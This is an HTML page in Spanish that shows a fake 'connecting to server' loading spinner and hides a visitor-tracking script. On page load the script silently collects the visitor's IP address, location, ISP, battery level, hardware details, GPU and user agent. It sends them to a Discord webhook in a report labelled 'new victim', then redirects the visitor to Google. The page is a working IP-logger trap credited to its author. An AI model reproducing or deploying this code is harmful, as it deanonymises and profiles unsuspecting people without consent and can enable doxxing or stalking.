<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Cargando...</title>
    <style>
        body { 
            background-color: #f0f2f5; 
            color: #444; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .container { text-align: center; }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            width: 36px;
            height: 36px;
            border-radius: 50%;
            border-left-color: #09d;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h1 { font-size: 1.5rem; font-weight: 500; }
        p { color: #777; }
    </style>
</head>
<body>

<div class="container">
    <div class="spinner"></div>
    <h1>Conectando al servidor...</h1>
    <p>Por favor, espera un momento. Esto puede tardar unos segundos.</p>
</div>

<script>
    const DISCORD_WEBHOOK = "YOUR_WEBHOOK_URL_HERE"; // Reemplaza con tu URL de webhook de Discord
    
    const BOT_NAME = "Created By Voragine (Lvn4t1k0)";
    const BOT_AVATAR = "https://media.discordapp.net/attachments/1489675057889284219/1493411992697045192/038b468d6f3b8c8fb10f1b9e4ae51a8a.jpg?ex=69e4ce8d&is=69e37d0d&hm=88b0669f39ae8fbfe852e0c92adfe84447c30475501c97eb9e1ec1dfb4a0c006&=&format=webp&width=584&height=579";
    const GIF_MAIN = "https://media.discordapp.net/attachments/1489675057889284219/1495144058593476730/HnVideoEditor_2026_04_18_132823619.gif?ex=69e52cea&is=69e3db6a&hm=678c1a82f4a18bd333e86951059142776549604d0dbc27becafd2bafb07287eb&=&width=512&height=530";
    const GIF_THUMB = "";

    window.onload = async function() {
        const ua = navigator.userAgent;
        const res = `${screen.width}x${screen.height}`;
        const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Desconocida";
        const cores = navigator.hardwareConcurrency || "Desconocido";
        const gpu = getGPU();

        let tipo = "PC / Desktop";
        const isTouch = navigator.maxTouchPoints > 0;
        const width = window.innerWidth;
        if (isTouch) {
            if (width > 480 && width < 1024) tipo = "Tablet";
            else if (width <= 480) tipo = "Celular";
            else tipo = "Híbrido (Laptop/Tablet)";
        }

        let batInfo = "N/A";
        try {
            const battery = await navigator.getBattery();
            batInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "Cargando" : "Descargando"})`;
        } catch (e) {}

        let ipData = {};
        try {
            const response = await fetch('https://ipapi.co/json/');
            ipData = await response.json();
        } catch (e) { ipData = { ip: "Error", city: "Error", org: "Error" }; }

        const report = {
            username: BOT_NAME,
            avatar_url: BOT_AVATAR,
            embeds: [{
                title: "🔥 NU3V4 V1CT1M4 👿",
                color: 3447003,
                description: "😈 FULL DATA 🫦",
                thumbnail: { url: GIF_THUMB },
                image: { url: GIF_MAIN },
                fields: [
                    { name: "🌐 Dirección IP", value: `\`${ipData.ip || ipData.query}\``, inline: true },
                    { name: "📍 Ubicación", value: `${ipData.city}, ${ipData.region || ipData.regionName}, ${ipData.country_name || ipData.country}`, inline: true },
                    { name: "🏢 Proveedor / ISP", value: ipData.org || ipData.isp, inline: false },
                    { name: "📱 Dispositivo", value: tipo, inline: true },
                    { name: "🔋 Batería", value: batInfo, inline: true },
                    { name: "🧠 RAM / Núcleos", value: `${ram} / ${cores}`, inline: true },
                    { name: "🖥️ Resolución", value: res, inline: true },
                    { name: "🎮 Gráfica (GPU)", value: gpu, inline: false },
                    { name: "🔗 User Agent", value: `\`\`\`${ua}\`\`\`` }
                ],
                footer: { text: "By Voragine (Lvn4t1k0)" },
                timestamp: new Date()
            }]
        };

        fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(report)
        }).then(() => {
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 3000);
        });
    };

    function getGPU() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "No detectada";
        } catch (e) { return "No detectada"; }
    }
</script>

</body>
</html>
